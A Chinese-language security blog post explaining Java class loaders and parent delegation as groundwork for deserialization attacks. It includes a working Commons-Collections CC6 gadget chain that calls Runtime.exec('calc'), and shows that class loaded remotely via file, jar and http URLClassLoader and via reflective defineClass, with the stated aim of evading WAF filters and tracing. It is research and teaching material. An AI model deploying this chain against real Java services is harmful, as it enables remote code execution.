---
title: "java类加载及双亲委派机制"
onlyTitle: true
date: 2024-7-31 16:40:01
categories:
- java
- java杂谈
tags:
- 类加载
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B891.png

---

前面的CC1和CC6，都是在Runtime.exec执行命令。如果WAF过滤了Runtime就寄，而且用命令的方式写入shell进行下一步利用，在流量中一个数据包就能把你的行为全部看完，很容易被分析出来。

如果用恶意字节码加载的方式，我们的流量会更乱，溯源更麻烦。而且最后触发点为defineClass，解决了过滤Runtime和exec的问题。

如果要学动态类加载，那一定绕不开类加载器的双亲委派机制

https://javaguide.cn/java/jvm/classloader.html#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%80%BB%E7%BB%93

也可以尝试自己调用ClassLoader.loadClass()进行调试（普通步入进不去，需要强制步入），但是不推荐，脑子会被搞得很乱。



## Java双亲委派类加载

JVM 中内置了三个重要的 `ClassLoader`：

1. **`BootstrapClassLoader`(启动类加载器)**：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK 内部的核心类库（ `%JAVA_HOME%/lib`目录下的 `rt.jar`、`resources.jar`、`charsets.jar`等 jar 包和类）以及被 `-Xbootclasspath`参数指定的路径下的所有类。
2. **`ExtensionClassLoader`(扩展类加载器)**：主要负责加载 `%JRE_HOME%/lib/ext` 目录下的 jar 包和类以及被 `java.ext.dirs` 系统变量所指定的路径下的所有类。
3. **`AppClassLoader`(应用程序类加载器)**：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。

除了 `BootstrapClassLoader` 是 JVM 自身的一部分之外，其他所有的类加载器都是在 JVM 外部实现的，并且全都继承自 `ClassLoader`抽象类。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105932213.png)

`ClassLoader` 类有两个关键的方法：

- `protected Class loadClass(String name, boolean resolve)`：加载指定二进制名称的类，实现了双亲委派机制 。`name` 为类的二进制名称，`resolve` 如果为 true，在加载时调用 `resolveClass(Class<?> c)` 方法解析该类。
- `protected Class findClass(String name)`：根据类的二进制名称来查找类，默认实现是空方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105804759.png)

双亲委派模型的执行流程：

- 在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载（每个父类加载器都会走一遍这个流程）。
- 类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 `loadClass()`方法来传递类）。这样的话，所有的请求最终都会传送到顶层的启动类加载器 `BootstrapClassLoader` 中。
- 只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载（调用自己的 `findClass()` 方法来加载类）。
- 如果子类加载器也无法加载这个类，那么它会抛出一个 `ClassNotFoundException` 异常。



由于loadClass是传递，所以只有AppClassLoader重写了loadClass，因为BootstrapClassLoader是C++实现的，已经无需由ExtClassLoader传递上去。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731113942238.png)

那为什么两个类都没实现findClass来加载类呢？实际上两个类都继承了URLClassLoader，调用URLClassLoader#findClass来通过路径加载类。



## 类加载器之URLClassLoader

上文的双亲委派，类加载器之间并不是继承的关系，而是使用组合关系来复用父加载器。

```java
public abstract class ClassLoader {
  ...
  // 组合
  private final ClassLoader parent;
  protected ClassLoader(ClassLoader parent) {
       this(checkCreateClassLoader(), parent);
  }
  ...
}

```

真实的继承关系如图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731111552787.png)

AppClassLoader和ExtClassLoader都是Launcher的静态内部类，继承自URLClassLoader

- SecureClassLoader：扩展了ClassLoader，并为定义具有相关代码源和权限的类提供了额外支持，这些代码源和权限默认情况下由系统策略检索。
- URLClassLoader：继承自SecureClassLoader，支持从jar文件和文件夹中获取class，继承于Classloader，加载时首先去Classloader里判断是否由启动类加载器加载过。

Class.forName()**这个方法只能创建程序中已经引用的类，如果我们需要动态加载程序外的类，Class.forName()是不够的**，这个时候就是需要使用URLClassLoader的时候。

因为newInstance()是调用无参构造函数，所以可以改恶意代码到构造函数内，也可以写到静态代码块或者构造代码块。

把CC6改个构造函数：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;


public class CC6TiedMapEntry {
    public CC6TiedMapEntry() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

### file协议

构建后放到指定的项目外目录，测试加载项目外路径的类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731151651287.png)

把项目文件下的CC6TiedMapEntry文件删去

用下列代码就能远程加载类

```java
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///E:\\CODE_COLLECT\\")});
        Class<?> clazz = urlClassLoader.loadClass("CC6TiedMapEntry");
        clazz.newInstance();
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731153412148.png)



### jar协议

上面的代码用的file协议，实际上jar协议和http协议也可以加载：

先创建工件，然后把CC6TiedMapEntry.class加入jar包下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154736468.png)

构建工件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154821585.png)

同理，传到目录下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154904750.png)

```java
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:file:///E:\\CODE_COLLECT\\CC6TiedMapEntry.jar!/")});
        Class<?> clazz = urlClassLoader.loadClass("CC6TiedMapEntry");
        clazz.newInstance();
    }
}
```

用上述代码进行加载，也是成功加载：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154932573.png)



### http协议

http就很简单了，python开个服务直接请求。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731162405290.png)

```java
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:9999/")});
        Class<?> clazz = urlClassLoader.loadClass("CC6TiedMapEntry");
        clazz.newInstance();
    }
}
```

当然也可以http搭配file和jar协议使用，自行发挥吧。



## 源码详解

除此以外还有一种更底层的代码进行类加载。我们深入分析一下下列代码是怎么加载类的。

```
public static void main(String[] args) throws Exception {
    ClassLoader classLoader = ClassLoader.getSystemClassLoader();
    Class<?> clazz = classLoader.loadClass("org.example.CC6TiedMapEntry");
    clazz.newInstance();
}
```

> ClassLoader.getSystemClassLoader()返回的是系统类加载器，通常是一个Launcher$AppClassLoader 的实例

我们指定的类先进入单参数的ClassLoader#loadClass，因为AppClassLoader，父类URLClassLoader及其父类SecureClassLoader里并没有单参数loadClass，但是SecureClassLoader继承了ClassLoader

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731173028112.png)

该loadClass调用了另一个双参数的loadClass，尽管ClassLoader实现了这个双参数的loadClass，但根据多态性原则，还是交给重载了该方法的子类AppClassLoader运行。

在AppClassLoader中调用了父类的loadClass，也就是ClassLoader的loadClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731175928852.png)

于是开始双亲委派

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180116014.png)

由于不在指定的目录下，BootstrapLoader和ExtClassLoader都加载不了，最后传回了AppClassLoader。

AppClassLoader#findClass不存在，交由其父类URLClassLoader#findClass处理。

于是在该方法中，获取了类路径，并调用defineClass加载字节码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180720964.png)

跟进defineClass，发现实际上是调用了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180820380.png)

在ClassLoader#defineClass进行了字节码的加载，具体的实现在defineClass1这个C++实现方法中。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731181000728.png)



这个过程不需要记住，只需要知道最后在ClassLoader#defineClass进行字节码的加载

调用过程：AppClassLoader#loadClass->ClassLoader#loadClass->双亲委派->AppClassLoader#findClass(无)->URLClassLoader#findClass->URLClassLoader#defineClass->ClassLoader#defineClass

双亲委派过程：检查是否加载过->ExtClassLoader#loadClass->BootstrapClassLoader->AppClassLoader#findClass



## defineClass底层加载

既然最后类加载的地方是defineClass，那我们反射直接调用一遍该方法测试一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png)

```java
public static void main(String[] args) throws Exception {
    Class<ClassLoader> cl = ClassLoader.class;
    Method defineclassmethod = cl.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    defineclassmethod.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry.class"));
    Class cc6Instance = (Class) defineclassmethod.invoke(ClassLoader.getSystemClassLoader(), "CC6TiedMapEntry", code, 0, code.length);
    cc6Instance.newInstance();
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731183540038.png)

可见，可以直接调用defineClass加载类。

尽管defineClass是protected final，其他地方依然有调用到该方法，让我们可以构造底层的恶意类加载攻击。

比如bcel，TemplatesImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png)

